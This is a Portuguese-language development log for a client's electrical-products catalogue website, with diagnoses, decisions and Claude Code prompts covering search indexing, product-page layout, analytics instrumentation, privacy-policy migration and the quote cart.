- **`type: 'producto'` é o filtro certo**: em bandejas são 36 produtos + 5
  `subfamilia`, que não são ficha.

**Ranking é necessário, e o protótipo mostrou por quê:** com match por E de todos
os tokens, `bandeja perforada 200mm` devolve **8** resultados, não 1 — todas as
peças que têm ancho 200 e variante perforada. A ficha certa está entre elas, mas
não em primeiro. Ordenar por nome resolve sem biblioteca.

### Prompt pro Claude Code

```
A busca do catálogo só compara a query com product.name. Hoje "CT3011",
"reduccion", "curva 90", "tapa" e o próprio exemplo do placeholder
("bandeja perforada 200mm") devolvem zero resultados.

Sem dependência nova em nenhum passo — é leitura de JSON, escrita de JSON e
comparação de string.

1. scripts/build-search-index.mjs — índice enxuto gerado no build
   Lê lib/catalog.json e escreve lib/search-index.json. Uma entrada por ficha:
   só type === 'producto' e só famílias com displayMode 'catalog' (hoje,
   bandejas: 36 entradas; os 5 type 'subfamilia' ficam de fora).

   Entrada: { id, name, categoryId, categoryName, image, haystack }
   - image = images.primary (o card do resultado precisa, e sem isso o
     CatalogPageClient volta a puxar o catálogo inteiro).
   - haystack = string única já normalizada, juntando:
     name, subtitle, id com hífen virando espaço, keywords (é STRING, não
     array), sku do topo quando existir, e de cada variante: v.sku ou v.code,
     v.label, e os valores de v.attributes; mais os values de cada
     dimensionAxes.
     Depois: remover pontuação, colapsar espaço, e deduplicar tokens
     preservando a ordem (corta ~20% do peso).

   package.json: "prebuild": "node scripts/build-search-index.mjs"
   .gitignore: lib/search-index.json — é gerado, não versionado.

2. lib/search.js — função pura, NÃO importa catalog.json
   - normalize(s): minúsculas, remover acentos (NFD + /[̀-ͯ]/g),
     e "200mm" → "200" (\d seguido de mm vira só o número).
   - searchProducts(query, { categoryId } = {}):
     quebra a query em tokens por espaço, casa quem tem TODOS os tokens no
     haystack, filtra por categoryId quando passado.
     Ordenar o resultado: primeiro quem casa todos os tokens no name
     normalizado, depois o resto; empate resolve por name A-Z.
     Importa lib/search-index.json.

3. components/CatalogPageClient.jsx passa a usar searchProducts.
   O card do resultado usa os campos do índice (id, name, categoryId,
   categoryName, image) — não chamar getAllProducts nem getCategoryById aqui,
   senão o catalog.json volta pro bundle e o item perde o sentido.
   O alt da imagem vira `${name} — BGA Electric`.

4. Caixa de busca na página de família (/catalogo/[categoria])
   Extrair o grid para um client component, como já foi feito em
   CatalogPageClient. Estado local com useState — NÃO usar useSearchParams
   aqui (quebra o build com output: 'export' fora de fronteira de Suspense).
   - Input acima do grid: searchProducts(q, { categoryId: categoria }).
   - Placeholder: "Buscar en {família} — nombre o código".
   - Sem resultado: "No encontramos nada en {família}" + link
     "Buscar en todo el catálogo" para /catalogo?q={q}.
   - Query vazia = grid completo, como hoje.

Casos de teste (todos devolvem 0 hoje; os números vêm do protótipo):
  CT3011                   → 1  bandeja-portacables
  CT3211                   → 1  bandeja-portacables (SKU da variante Tapa)
  reduccion                → 3  as reduções, sem acento
  curva 90                 → 4  as curvas de 90°
  tapa                     → 22 as páginas com variante de tapa
  bandeja perforada 200mm  → 8, com bandeja-portacables em PRIMEIRO
  200                      → 32 páginas cujo eixo ancho inclui 200

Rode `npm run build` no final e confirme que o chunk que hoje carrega o
catálogo (476-*.js) não cresceu.
```

**Como conferir:** os 7 casos acima. O que prova que o índice funcionou não é a
busca achar — é o chunk `476-*.js` não crescer. Se cresceu, alguma coisa no
`CatalogPageClient` ainda importa o `catalog.json`.

**Commit:** `feat: busca por código, sem acento e por frase — índice enxuto no build`

---


## 8. Dois ajustes na ficha (achados em 30/08)

### 8a. Recomendados estão no lugar errado da página

Hoje a ordem é: card → `longDescription` → `RecommendedProducts` → FAQ. O
complemento aparece depois da descrição longa de SEO.

Olhando o dado: em `bandeja-portacables`, `recommended` é `['kit-de-uniones']`.
Isso **não é "você também pode gostar"** — é *"você precisa disso pra instalar"*.
Complemento, não alternativa. E complemento tem hora: logo depois de agregar.

**Não vai para a coluna esquerda** (a Yuki perguntou e desconfiou sozinha, com
razão): a coluna tem 260px, o card viraria miniatura ilegível; e aquela coluna é
*esta peça* — outro produto ali mistura identidade. No mobile as colunas
empilham, então cairia logo abaixo da imagem principal, cortando a configuração
antes de a pessoa ter configurado nada.

O movimento é vertical: subir `RecommendedProducts` para logo abaixo do card,
antes da `longDescription`, e trocar o título "Productos recomendados" por algo
que diga a relação — "Para instalar esta pieza". `recommended` existe em 35 das
fichas, então é sistêmico.

### 8b. Os diagramas Tipo U / Tipo C parecem clicáveis e não são

Eles não são fotos do produto — são a **legenda do select acima deles**. Quem não
sabe o que é Tipo U precisa deles para escolher no dropdown. Por isso ficam onde
estão: mover para a coluna da imagem os desconecta da escolha que explicam e os
faz competir com o render da peça.

O que incomoda é o peso: dois cards grandes, com borda e fundo, parecendo o lugar
onde se clica — logo abaixo de um select que ainda diz "Seleccioná modelo y
tipo…". Parecem controle e são legenda.

Clicáveis seria pior: com 4 variantes de peça (Lisa U, Lisa C, Perforada U,
Perforada C), clicar em "Tipo U" é ambíguo.

`secciones` existe em **1 das 36 páginas** (`bandeja-portacables`). É caso
especial na página principal, não componente de sistema — não vale redesenhar o
controle de variante por causa dela.

**Correção do diagnóstico (30/08): não encolher os diagramas.** A primeira ideia
era reduzir para ~48px. Errada. Medindo os arquivos: são 1400×990 e **o desenho
ocupa 56% da largura e 27% da altura** — o resto é branco. No contêiner de 56px
com `object-contain`, o traço renderiza com **~15px**. Não é o contêiner que está
pequeno, é a moldura vazia que encolhe o traço. Recortando no traço (proporção
~3:1), o mesmo espaço rende ~50px de desenho — 3,3× maior, sem mexer no layout,
e o arquivo até diminui (4,2KB → 2,8KB). Nada de lupa: seria maquinário para um
desenho de linha de 4KB.

**E os dois diagramas hoje são indistinguíveis.** A diferença entre U e C é o
**retorno na ala** — a dobra para dentro no topo — e são 3,2% dos pixels,
concentrados na borda superior fina, a primeira coisa que some a 15px. A Yuki
confirmou que não via diferença. Por isso o rótulo passa a dizer também em
palavra: **"Tipo U — alas rectas"** e **"Tipo C — alas con retorno"**, que é o
que a `richDescription` da família já afirma. Desenho pequeno + palavra resolve;
desenho pequeno sozinho, não.

### Prompt pro Claude Code

```
Dois ajustes de layout na ficha de produto.

1. app/catalogo/[categoria]/[produto]/page.jsx
   - Mover <RecommendedProducts> para logo depois de <ProductSheet>, antes do
     bloco de longDescription.
2. components/RecommendedProducts.jsx
   - Título passa de "Productos recomendados" para "Para instalar esta pieza".
     O campo `recommended` do Sheet é complemento de instalação, não alternativa.
3. app/catalogo/[categoria]/[produto]/ProductSheet.jsx — bloco product.secciones
   - Mantém a posição (logo abaixo do select de variante): é legenda do select.
   - Tira o peso de card: sem borda, sem fundo. NÃO encolher o diagrama — os
     arquivos foram recortados na margem branca e agora têm proporção ~3:1;
     deixe-os ocupar a largura disponível de cada metade, com altura livre.
   - Rótulo em duas partes, porque o desenho sozinho não distingue os perfis:
     "Tipo U — alas rectas" e "Tipo C — alas con retorno", em text-text-muted.
   - Não tornar clicável.

Copy em espanhol. Rode `npm run build` no final.
```

---

## 8c. O complemento sobe para debaixo do botão (30/08, depois do 8)

O 8a subiu o `RecommendedProducts` para logo depois do card. Ainda é longe: as
abas ficam entre o botão e ele. A Yuki pediu o complemento **colado no CTA** — e
os dados dizem que ele nem devia ser uma seção.

**Contagem nas 36 fichas ativas:** 33 têm **exatamente 1** recomendado, 2 têm 2, e
1 não tem nenhum (`kit-de-uniones`, que é ele próprio o complemento dos outros).
Hoje isso ocupa seção de largura total, com `<h2>` e scroller horizontal —
mobília para um card só.

**Vira uma tira compacta dentro da coluna direita**, logo abaixo do CTA. É onde a
pergunta "e as uniões?" nasce: no segundo seguinte ao "agregar".

**Continua link para a ficha, nunca botão de agregar** — o `kit-de-uniones` tem
eixo de `ala` e imagem por ala, ou seja, também precisa de configuração. Mesma
regra do item 2: agregar só existe onde dá para configurar.

### Prompt pro Claude Code

```
O produto recomendado vira uma tira compacta logo abaixo do CTA da ficha, dentro
da coluna direita. Hoje é uma seção de largura total com h2 e scroller, e 33 das
36 fichas têm um único recomendado — mobília demais para um item.

1. app/catalogo/[categoria]/[produto]/page.jsx
   - Remover o <RecommendedProducts> que está entre <ProductSheet> e o bloco de
     longDescription.
   - Passar a lista para a ficha: <ProductSheet ... recommended={recommendedProducts} />

2. components/RecommendedProducts.jsx — vira tira compacta
   - Sem <section>, sem <h2>, sem scroller horizontal.
   - Rótulo pequeno "Para instalar esta pieza" (text-[11px], text-text-muted).
   - Uma linha por item, ocupando a largura disponível: thumb ~36px, nome do
     produto, seta → à direita. Dimensionar para 1 ou 2 itens, não para lista.
   - Cada linha é um <Link> para /catalogo/{categoryId}/{id}/, com hover de borda
     brand-accent e o mesmo tratamento em :focus-visible, igual aos cards.
   - Lista vazia continua não renderizando nada.

3. app/catalogo/[categoria]/[produto]/ProductSheet.jsx
   - Aceitar a prop `recommended` e renderizar a tira logo depois do bloco dos
     CTAs (quantidade + Agregar) e ANTES do link "¿Dudas técnicas?".
   - Não transformar em botão de agregar: a peça recomendada também precisa de
     configuração própria. Só link para a ficha dela.

Copy em espanhol. Rode `npm run build` no final.
```

---

## 9. As abas da ficha são conteúdo global repetido 36 vezes — em aberto

Levantamento de 30/08, ainda **sem decisão**:

- **Especificaciones:** 33 de 36 fichas têm **zero** linhas próprias
  (`dimensions`, `features`, `note`, `unidadVenta` vazios — as medidas dessas
  peças vivem nos eixos ancho/ala, no configurador). Sobram Familia, Proceso de
  unión e Tolerancia de espesor, e os dois últimos são globais.
- **Materiales y Tratamientos:** é `globalSpecs.surfaceTreatments` — idêntico nas 36.
- **Normas:** array escrito à mão dentro do JSX — idêntico nas 36.
- `gs.joiningProcess` aparece **duas vezes**, na aba Especificaciones e de novo
  na Materiales.

Três abas prometendo profundidade técnica e entregando texto que se repete em 36
páginas. Fechar por padrão (a ideia inicial da Yuki) esconderia o problema em vez
de resolvê-lo.

**Caminho proposto:** manter na ficha só o que é daquela peça — nas 3 páginas que
têm algo — e linkar para `/materiales-y-tratamientos`, que já existe e diz tudo
isso uma vez. Nas outras 33 a tira de abas não aparece, e o `joiningProcess`
duplicado some junto.

**Por que estava parado:** as abas foram povoadas nos briefs pensando em conteúdo
indexável. Tirá-las remove texto do HTML de 36 páginas. A leitura do Claude é que
bloco repetido em 36 páginas quase não soma para SEO e que uma página forte
linkada por 36 é o padrão — mas isso **não foi verificado em fonte atual**.

### Decidido em 30/08

**Correção do que estava escrito acima:** "olhar o Search Console antes" não é
possível. O catálogo nunca foi publicado; não existe dado nenhum dessas páginas.
A sequência honesta é decidir pelo usuário agora, publicar, e revisar com dado
depois. Se o orgânico não vier, o caminho de volta não é reencher aba com texto
genérico — é escrever conteúdo próprio por peça, que é o que rankeia de todo
jeito.

**Nem o que parecia ser da peça é da peça:** `minThicknessRule` é idêntico nas 36;
`recommendationNote` é idêntico nas 22 que o têm. O que é único por página é o
`longDescription` (mediana de 623 caracteres) e a FAQ — 36 FAQs distintas —, mais
eixos, variantes e SKUs. Ou seja, **as fichas não ficam magras sem as abas**.

**O argumento do usuário, que é o que decidiu:** três abas prometendo
profundidade técnica e entregando o mesmo texto em 36 páginas ensinam que ali não
tem nada. Aí, na página onde houvesse algo específico, ninguém abre. Repetição
não cansa só — destrói o valor de sinal do container. E o conteúdo não é
desnecessário: está no lugar errado. `/materiales-y-tratamientos` já diz tudo
isso uma vez, bem.

### Prompt pro Claude Code

```
As três abas da ficha (Especificaciones, Materiales y Tratamientos, Normas) são
conteúdo global repetido nas 36 fichas — inclusive o que parecia ser da peça:
minThicknessRule é idêntico nas 36 e recommendationNote nas 22 que o têm.

Em app/catalogo/[categoria]/[produto]/ProductSheet.jsx:

1. Remover a tira de abas e todo o conteúdo delas, junto com o estado activeTab
   e o array de normas escrito à mão no JSX. Some com isso a duplicação do
   gs.joiningProcess, que aparecia em duas abas.

2. No lugar, uma linha discreta no fim do bloco da ficha:
   "Materiales, tratamientos y normas — iguales para toda la línea" seguida do
   link "Ver detalle →" para /materiales-y-tratamientos/.
   text-xs text-text-muted, link em font-semibold text-brand-primary.

3. Não tocar no longDescription nem na FAQ da página (ficam em
   app/catalogo/[categoria]/[produto]/page.jsx) — são o conteúdo próprio de cada
   ficha e o que a distingue das outras 35.

4. Conferir se globalSpecs ainda é usado no componente depois da remoção; se não
   for, tirar a prop e o que ficou órfão em page.jsx.

Rode `npm run build` no final e confirme que as 54 páginas continuam gerando.
```

**Como conferir:** a ficha termina no bloco de configuração + descrição longa +
FAQ, com uma linha para materiales. Nenhuma página perde descrição própria nem
FAQ. Depois de publicar, é este o item para revisitar com o Search Console —
não antes, porque não há dado.

**Commit:** `refactor: fuera las pestañas globales de la ficha, link a materiales`

---

## 11. Política de privacidade — some na troca de domínio (30/08)

**Contexto, corrigido:** `bga.com.py` serve o projeto **`bga-site`** (a landing
antiga). O `bga-catalogo` **nunca foi publicado** — não é deploy quebrado, é
decisão da Yuki de não colocar o catálogo no ar ainda. O GA4 dispara porque o
`bga-site` usa a mesma propriedade (`G-3PF2RG7WNG`), então os 404 que aparecem no
relatório vêm de lá, não daqui.

**O que isso revela:** `https://bga.com.py/politica-privacidad.html` existe e está
no ar — cobre coleta de dados pelo formulário de cotização, Google Analytics e
cookies. O `bga-catalogo` **não tem essa página**: nenhuma rota, nenhum link,
nenhuma menção a "privacidad" no projeto inteiro (verificado por grep).

Como este repo contém a LP (`app/page.jsx` → `LandingPage`), publicar o catálogo
significa apontar o domínio para cá e aposentar o `bga-site`. Nesse dia:

- `/politica-privacidad.html` vira **404** — é a primeira URL concreta do item 4
  dos briefs (redirects 301), que até agora era genérico
- o site novo fica **sem política de privacidade** coletando *mais* dados que o
  antigo: carrinho, formulário de lead, webhook para o Apps Script, GA4
- os anúncios planejados (Google, Instagram) costumam exigir política acessível
  no destino — **não verificado nas regras atuais de cada plataforma**, conferir
  na fonte antes de subir campanha

**O que fazer:** portar a página para uma rota do projeto
(`app/politica-privacidad/page.jsx`, texto vindo do que já está no ar), linkar no
rodapé, e registrar o 301 de `/politica-privacidad.html` para a rota nova no
console do Amplify — com `trailingSlash: true`, a URL nova é
`/politica-privacidad/`, então a antiga quebra mesmo com o mesmo nome.

**Antes de portar:** a política atual descreve o site antigo. O catálogo coleta
mais coisa (itens da cotação, observações, dados do projeto gravados na planilha
do cliente via Apps Script). O texto precisa de uma revisão de conteúdo, não só
de um copiar e colar. Isso é decisão da Yuki e possivelmente do cliente.

---

## 10. Instrumentar o 404 antes da troca de domínio (30/08)

**Correção do registro:** este item nasceu de um 404 que a Yuki tinha visto no
GA4 — e ela conferiu depois: **não era deste site**, era do site da Faro ou do
portfólio. Não há 404 observado aqui. O item continua valendo, mas por outro
motivo: é instrumentação para o dia da troca de domínio, não conserto de problema
observado. Prioridade baixa até lá.

**O que está frouxo:** `app/not-found.jsx` não exporta `metadata`, então herda o título padrão
do site (`config.meta.title`). No GA4 o 404 chega com o **mesmo `page_title` da
home** — dá para ver que houve 404, não em qual caminho.

**Segundo problema, na mesma tela:** o CTA do 404 é "Volver al catálogo" apontando
para `/catalogo`. Enquanto o deploy estiver parado no build antigo, `/catalogo`
também é 404 — o beco sem saída manda para outro beco sem saída.

**Por que ainda vale:** no dia em que o domínio apontar para cá, é esse evento que
responde com dado quais URLs do `bga-site` continuam sendo acessadas e merecem
redirect 301 (item 4 dos briefs). Antes disso, não há o que medir.

### Prompt pro Claude Code

```
O 404 precisa ser identificável no GA4 e não pode terminar em beco sem saída.

Em app/not-found.jsx:

1. Disparar evento próprio usando o componente que já existe, components/TrackView:
   <TrackView event="pagina_no_encontrada" params={{ ruta: <caminho atual> }} />
   O caminho vem de window.location.pathname — TrackView já é client component,
   então ler no efeito, nunca na render (o build é export estático).
2. Segundo CTA além de "Volver al catálogo": um link para a home. Se o catálogo
   estiver indisponível, o usuário ainda tem para onde ir.

Não mexer em mais nada. Rode `npm run build` no final.
```

**Depois do deploy:** olhar `pagina_no_encontrada` no GA4 por `ruta`. Caminhos
antigos com volume real = candidatos a redirect 301 no console do Amplify. Sem
volume = o item 4 dos briefs pode ser fechado sem trabalho.

---

## 12. O GA4 dispara em desenvolvimento (30/08)

**Como apareceu:** no relatório de Página de destino do GA4 havia
`/catalogo/bandejas/` — uma rota que **não está publicada**. É tráfego do
`localhost` da Yuki.

**Causa:** `components/Analytics.jsx` injeta o GA4 sempre que existe
`gaMeasurementId`, sem olhar o ambiente. `npm run dev` reporta para a propriedade
de produção do cliente (`G-3PF2RG7WNG`), a mesma que o `bga-site` usa.

**Consequência:** toda a sessão de testes de hoje entrou nos dados do cliente. E
como a medição do catálogo é o que deve virar case, o baseline precisa estar
limpo antes do lançamento.

### Prompt pro Claude Code

```
O GA4 está sendo carregado também em desenvolvimento, e o localhost reporta para
a propriedade de produção do cliente.

Em components/Analytics.jsx: não renderizar nada quando
process.env.NODE_ENV !== 'production'.

Manter a guarda que já existe do gaMeasurementId ausente, e o comentário do topo
do arquivo atualizado para dizer as duas condições.

Não mexer em mais nada.
```

**Ressalva:** `next build` roda com `NODE_ENV=production`, então servir o `out/`
localmente ainda reportaria. Se isso virar hábito, acrescentar também uma checagem
de `window.location.hostname` (pular `localhost` e `127.0.0.1`). Para o fluxo de
hoje, que é `npm run dev`, a guarda de ambiente resolve.

**Decidido (30/08):** a Yuki vai configurar **filtro de tráfego interno** no GA4 e
pedir o IP do Akira. Vale pegar também o da funcionária dele (mexe na planilha e
abre o site) e o da Aida, quando ela começar a receber cotações.

Três armadilhas conhecidas desse caminho:

- **São duas etapas.** Definir o tráfego interno no stream só marca as sessões
  com `traffic_type=internal`; o filtro de dados correspondente nasce em modo de
  teste e, enquanto estiver assim, marca mas não exclui. Os nomes dos menus do
  GA4 mudam com frequência — a lógica de dois passos, não.
- **Não é retroativo.** Vale só para dados novos; o GA4 não guarda IP para
  reprocessar. O histórico com os testes de hoje continua lá, então o baseline do
  case ainda precisa de recorte por data.
- **IP de escritório costuma ser dinâmico.** Se mudar, o filtro para de funcionar
  em silêncio. Se o provedor der faixa, filtrar por CIDR. E para a máquina da
  Yuki a guarda de ambiente no código é mais confiável que IP, porque não depende
  de onde ela está trabalhando.

**Fora do alcance:** o `/?` visto no mesmo relatório não vem deste repo — o form
da LP daqui chama `preventDefault()` na primeira linha. O que está no ar é o
`bga-site`, outro repositório. Um `<form>` sem `preventDefault` submetendo por GET
produz exatamente `/?`; é por aí que se procura, se alguém for investigar lá.

---

## 13. O produto não chega na primeira dobra da página de família (31/08)

**Medido em `/catalogo/bandejas`:** ~810px de conteúdo antes do grid. Os dois
blocos que ocupam isso são o `richDescription` (1167 caracteres, 3 parágrafos,
~360px) e os 6 cards de intenção, que em desktop viram 2 linhas de cards de
~108px (~308px). O card do produto não é o problema.

**Decidido (31/08):** o texto desce; os cards viram uma linha de chips. E o card
"Galvanizado en caliente" **sai** — é o único dos 6 que não aponta para dentro do
catálogo, e esse destino já tem link próprio embaixo da tabela de materiais
(`Ver materiales y tratamientos en detalle →`). Repetir ali em cima seria o mesmo
link duas vezes na mesma página. A regra que fica: **chip é atalho de navegação
dentro da família; conteúdo é conteúdo, e mora embaixo.**

### Prompt pro Claude Code

```
Na página de família (app/catalogo/[categoria]/page.jsx) o grid de produtos só
começa depois de ~810px de conteúdo. Reordenar para o produto entrar na primeira
dobra. Sem componente novo e sem dependência.

1. richDescription desce
   Mover o bloco do category.richDescription (a div com os parágrafos) para
   depois do <CategoryProductsGrid>, imediatamente antes da seção "Material y
   tratamiento según ambiente". Dar a ele um h2 no padrão das outras seções:
   "Sobre la línea {category.name}". Mantém max-w-3xl e mb-10.
   Modos pdf e contact não mudam — lá o texto é category.description e fica
   onde está.

2. Cards de intenção viram uma linha de chips, acima do grid
   Filtrar por card.href.startsWith('/catalogo/') — hoje sobram 5 (curvas,
   reducciones, soportes, uniones, salidas) e sai o de galvanizado.
   - Substituir a seção "¿Qué necesitás hacer?" por uma linha de <Link>.
     Texto do chip = card.tag. Sem label e sem description.
   - Chip: border border-border-subtle rounded-full px-3 py-1.5 text-xs
     font-semibold text-brand-primary bg-white hover:border-brand-primary/30
     transition whitespace-nowrap.
   - Container: flex items-center gap-2 mb-6, overflow-x-auto flex-nowrap no
     mobile e flex-wrap a partir de md; scrollbar escondida.
   - Rótulo antes, na mesma linha: "Ir directo a:" em text-xs text-text-muted
     shrink-0.

3. A linha "Armá tu lista de productos y pedí cotización" fica onde está.

Ordem final em modo catalog:
  breadcrumb → H1 → linha de cotización → chips → Productos (busca + grid)
  → Sobre la línea → tabla de materiales → FAQ

Rode `npm run build` no final.
```

**Como conferir:** em 1440×900, o primeiro card de produto tem que estar visível
sem rolar. No mobile, os chips rolam na horizontal sem empurrar o grid para
baixo.

**Commit:** `feat: producto en la primera dobra de la página de familia`

---

## 14. O botão de cotización some quando o carrinho está vazio (31/08)

**Como está:** `CartBadge.jsx` renderiza o link com `invisible
pointer-events-none` quando `items.length === 0` — o espaço fica reservado, mas
não há nada para ver nem para clicar. O comentário do arquivo diz o porquê:
"carrinho é estado, não CTA".

**Por que muda:** desde o item 2, `Agregar a cotización` só existe na ficha. Quem
entra pela home ou por uma família não vê nada que diga que este site tem lista
de cotização — o mecanismo inteiro fica invisível até a pessoa descobrir sozinha
uma ficha e clicar. Vazio escondido faz sentido num e-commerce, onde todo mundo
já sabe o que é um carrinho; aqui o fluxo é o produto.

**A regra continua valendo, com um ajuste:** o carrinho vazio não é CTA — não
compete com o `Agregar a cotización` da ficha. Mas precisa estar visível. Vazio =
tinta leve, sem número. Com item = a pílula amarela sólida, com a contagem.

**Cor decidida na tela, não no prompt (31/08):** a primeira versão saiu com
contorno cinza. A Yuki apontou que esperava amarelo, e renderizado ela tem razão
— a diferença de intensidade (15% de fundo contra 100%) já separa os dois papéis
sem precisar trocar de matiz, e o amarelo diz que aquilo é da marca e é clicável.
Vazio: `bg-brand-accent/15 border border-brand-accent/40`, hover adensa
(`/25` e `/70`) em vez de virar cinza — hover não troca de cor, adensa a mesma.
**O que se perde:** com os dois estados amarelos, a diferença entre vazio e cheio
é só o número. Se aparecer "não sei se tem coisa na minha lista", a causa é esta.

O destino já está pronto: `/cotacao` tem estado vazio ("Tu cotización está
vacía" + "Explorar catálogo →"), então clicar vazio não cai em página quebrada.

### Prompt pro Claude Code

```
Em components/CartBadge.jsx: o botão de cotización não pode mais sumir quando o
carrinho está vazio.

Hoje o vazio usa `invisible pointer-events-none` e aria-hidden/tabIndex=-1.
Passa a ter dois estados visíveis, os dois clicáveis:

- Vazio (count === 0): só o label, sem número. Amarelo em tinta leve —
  bg-brand-accent/15 border border-brand-accent/40 text-brand-primary,
  hover:bg-brand-accent/25 hover:border-brand-accent/70. Sem aria-hidden e sem
  tabIndex=-1.
- Com item: exatamente o que já existe — bg-brand-accent text-brand-primary,
  label + " · " + contagem.

Manter em ambos: px-3 py-1.5 rounded-full text-xs font-semibold transition.
Remover o span de largura fixa (w-4) — ele existia para o número não empurrar o
menu, e agora o vazio não tem número. A mudança de largura ao adicionar o
primeiro item é feedback da ação da pessoa, não ruído.

Acessibilidade: aria-label no link — "Cotización, vacía" quando vazio,
"Cotización, {count} producto(s)" quando tem item.

Atualizar o comentário do topo do arquivo: o carrinho vazio é visível mas
discreto — não compete com o "Agregar a cotización" da ficha, e existe para que
o fluxo de cotización seja descobrível por quem nunca abriu uma ficha.

Não mexer no Header nem no /cotacao. Rode `npm run build` no final.
```

**Como conferir:** carrinho vazio, o botão aparece com contorno e leva ao estado
vazio da `/cotacao`. Com um item, volta a ser a pílula amarela com o número. Nas
duas telas o menu não pula de posição.

**Commit:** `fix: botón de cotización visible también con el carrito vacío`

---

## 15. "Ya tengo mi lista" no estado vazio da cotización (31/08)

**De onde veio:** o Akira diz que muita gente chega com a lista pronta — foto de
um orçamento, planilha, PDF do projetista. Hoje o site só oferece o caminho de
montar item por item.

**Decidido (31/08): a versão simples primeiro.** Upload de arquivo é possível sem
serviço novo — o Apps Script que já recebe as cotizaciones (`doPost` → aba
"Cotizaciones") gravaria no Drive —, mas vem com resposta opaca (`no-cors`, o
site não consegue confirmar que chegou), limite prático de poucos MB por causa
do base64, redeploy do script, e um endpoint aberto cujo segredo está no bundle:
hoje o pior caso é lixo na planilha, com upload passa a ser lixo no Drive do
Akira.

O caminho simples é o WhatsApp, que o fluxo já usa: a pessoa anexa a foto ou o
Excel na própria conversa. **E o botão é o instrumento de medição** — em duas
semanas o `click_whatsapp` com `origen: cotizacion_vacia` diz quantas pessoas
realmente chegam com lista pronta. Se o número justificar, aí o upload de verdade
vira item, com dado em vez de intuição.

### Prompt pro Claude Code

```
No estado vazio da cotización (app/cotacao/page.jsx, o bloco de
items.length === 0), acrescentar um segundo caminho: quem já tem a lista pronta
manda por WhatsApp, anexando foto ou Excel na conversa.

Hierarquia: "Explorar catálogo →" continua sendo o botão primário amarelo. O
novo é secundário — link com ícone do WhatsApp, sem fundo, para não competir.

Abaixo do botão que já existe:
  - Texto: "¿Ya tenés tu lista? Mandanos la foto o el Excel por WhatsApp y te
    cotizamos." em text-xs text-text-muted.
  - Link: "Enviar mi lista por WhatsApp" — text-sm font-semibold text-brand-primary
    hover:underline, com o mesmo SVG de WhatsApp já usado em
    app/catalogo/[categoria]/page.jsx, 14x14, em text-wa.
  - Destino: https://wa.me/{config.contact.whatsapp sem não-dígitos} com
    text = "Hola, tengo mi lista de materiales — se la envío por acá."
    (encodeURIComponent), target="_blank" rel="noopener noreferrer".

Medição, no mesmo commit: no clique, antes de abrir, chamar
  track('click_whatsapp', { origen: 'cotizacion_vacia' })
usando o track de lib/analytics.js. Reaproveitar o evento que já existe — não
criar nome novo; a ficha já manda origen: 'ficha'.

Não mexer no formulário de baixo nem no fluxo com itens no carrinho.
Rode `npm run build` no final.
```

**Como conferir:** carrinho vazio → o link aparece abaixo do botão amarelo e abre
o WhatsApp com a mensagem pronta. No DebugView do GA4, o `click_whatsapp` chega
com `origen: cotizacion_vacia`.

**Depois, no GA4:** `origen` é parâmetro personalizado — para aparecer nos
relatórios normais precisa estar registrado como dimensão personalizada com
escopo de evento. Sem isso, só se vê em Tempo real e DebugView. Vale conferir
antes de esperar o número, porque não é retroativo.

**Commit:** `feat: enviar lista propia por WhatsApp desde la cotización vacía`

---

## 16. O CTA da ficha está longe demais (31/08)

**Medido:** na bandeja portacables, a coluna de configuração acumula ~670px antes
do botão — descrição, variante, diagrama, dois eixos, aviso de espessura,
recomendação, material, espessor, SKU, "pieza a medida". O `Agregar a cotización`
cai por volta dos 750px de página, fora da primeira dobra.

**As abas (item 9) não têm parte nisso** — elas ficam *abaixo* do CTA. Encurtar a
ficha é este item; o 9 é sobre repetição de conteúdo.

**O que engorda são dois blocos que cometem o mesmo erro das abas:** conteúdo
genérico mostrado sempre.

- O aviso de espessura lista as **três** regras o tempo todo, mesmo depois da
  pessoa escolher o ancho. Ela lê três linhas para descobrir qual é a dela.
- A recomendação é idêntica nas 22 fichas que a têm, aparece sempre, e o texto
  fala de ancho ≥500 — ou seja, é conselho condicional exibido incondicionalmente.

E há um efeito que não é de altura: os dois são caixas amareladas entre os
seletores e o botão amarelo. Além de afastar o CTA, competem com ele.

**Diagramas U/C vão para a coluna esquerda** (ideia da Yuki, 31/08): hoje ficam
entre o seletor de variante e os eixos, no meio do caminho até o botão. São
imagem, pertencem ao lado da galeria — que tem ~350px de espaço morto embaixo.
**Alcance honesto: só 1 das 36 fichas tem `secciones`** (bandeja-portacables). É
a peça principal do Akira, e o lugar certo conceitualmente, mas não encurta as
outras 35.

**Frame da imagem — decidido não mexer agora.** Os 48 renders vão de 0,45 a 2,48
de proporção (mediana 1,42): 29 paisagem, 16 quase quadrados, 3 retrato. O frame
quadrado existe porque o conjunto é heterogêneo. Um 4:3 economizaria ~65px e
cobraria ~25% de tamanho das três verticais — pouco ganho para o custo, e melhor
reavaliar com a ficha já encurtada.

**Duas colunas no configurador — anotado, não decidido.** A coluna direita tem
~880px em 1180 e empilha tudo em linha cheia; o desperdício horizontal está aí,
não na galeria. Mas configurador em duas colunas quebra a leitura de sequência
(variante → eixos → material → espessor → SKU) e gente pula passo. Se for por
esse caminho, só o que **não é escolha** vai para o lado. Reavaliar depois deste
item.

### Prompt pro Claude Code

```
Encurtar a coluna de configuração da ficha
(app/catalogo/[categoria]/[produto]/ProductSheet.jsx) para o "Agregar a
cotización" subir. Três mudanças, nenhuma remove informação do usuário — todas
trocam texto genérico por resposta.

1. Aviso de espessura contextual (~linha 411)
   Hoje o bloco lista todas as thicknessRules. Passa a mostrar só a regra que
   vale para o ancho selecionado: percorrer thicknessRules na ordem e pegar a
   primeira que casa com selectedAxes.ancho (os ops são >=, <=, >, <, =).
   Uma linha: "Ancho {ancho} mm → espesor mínimo {gauge}".
   Manter a caixa e o ícone, sem a lista.
   Se não houver eixo ancho ou nenhuma regra casar, manter a lista como está —
   é o fallback, não o caminho normal.

2. Recomendação condicional (~linha 429)
   Só renderizar product.recommendationNote quando selectedAxes.ancho for >=
   thicknessRules[0].width (hoje 500, que é exatamente do que o texto fala).
   Sem ancho selecionado ou abaixo disso, não renderizar.

3. Diagramas de corte U/C vão para a coluna esquerda
   Mover o bloco dos diagramas (product.secciones, hoje dentro do bloco de
   variante) para a coluna esquerda, abaixo da galeria e das miniaturas
   pieza/tapa. Mantém os rótulos Tipo U / Tipo C — o rótulo é o que desambigua,
   a imagem ajuda (regra da sessão de 30/08).
   A coluna esquerda tem 260px: o grid de 2 colunas continua servindo.

Não mexer na ordem dos seletores, no SKU composto nem nos CTAs.
Rode `npm run build` no final.
```

**Como conferir:** escolher ancho 600 e ver uma linha só de espessura, com #14.
Escolher 200 e ver #18 — e a recomendação sumir. Em 1440×900, o `Agregar a
cotización` deve estar visível sem rolar, ou muito perto disso.

